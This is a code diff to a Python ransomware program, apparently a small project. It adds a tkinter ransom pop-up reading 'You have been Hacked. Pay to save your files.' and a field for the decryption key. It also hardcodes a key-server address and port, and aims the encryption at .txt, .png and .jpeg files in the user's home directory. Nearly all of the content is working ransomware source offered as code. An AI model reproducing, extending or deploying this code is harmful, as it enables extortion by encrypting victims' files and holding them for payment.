@@ -8,6 +8,8 @@ import socket
 import os
 import json
 import gc
+import tkinter as tk
+from tkinter import messagebox
 from cryptography.fernet import Fernet
 
 class Encoder:
@@ -112,11 +114,42 @@ class Decoder:
     def clear_memory(self):
         gc.collect()
 
+class PopUp:
+
+    def __init__(self, decoder):
+        self.decoder = decoder
+        self.root = tk.Tk()
+        self.root.title("You have been Hacked. Pay to save your files.")
+        self.root.geometry("400x200")
+
+
+        self.label = tk.Label(self.root, text="Enter your decryption key:")
+        self.label.pack(pady=10)
+
+        self.entry = tk.Entry(self.root, width=50)
+        self.entry.pack(pady=10)
+
+        self.decrypt_button = tk.Button(self.root, text="Decrypt", command=self.process_input)
+        self.decrypt_button.pack(pady=10)
+
+    def process_input(self):
+        key = self.entry.get()
+        if key:
+            try:
+                key_bytes = key.encode()
+                self.decoder.find_and_decrypt(key_bytes)
+                messagebox.showinfo("Success", "Thank you for your business!")
+                self.root.destroy()
+            except Exception as e:
+                messagebox.showerror("Error", f"Decryption failed: {e}")
+        else:
+            messagebox.showwarning("Input needed", "Please enter a decryption key")
+
 def main():
-    host = '0.0.0.0' #Change to the server's IP
+    host = '192.168.42.130' #Change to the server's IP
     extensions = ['.txt', '.png', '.jpeg']
     port = 9672 #Change to the port the server is listening on
-    directory = 'c:/Users/' + Encoder.get_username()
+    directory = 'c:/Users/' + os.getlogin()
 
     test_encode = Encoder(host, port, directory, extensions)
     test_encode.find_files()
@@ -125,13 +158,8 @@ def main():
 
     try:
         decoder = Decoder(host, port, directory)
-        key = decoder.request_key()
-
-        if key:
-            decoder.find_and_decrypt(key)
-            print("Decrypted all the files")
-        else:
-            print("Key was incorrect, try again")
+        pop_up = PopUp(decoder)
+        pop_up.root.mainloop()
     except Exception as e:
         print(f"Some error occured: {e}")
 
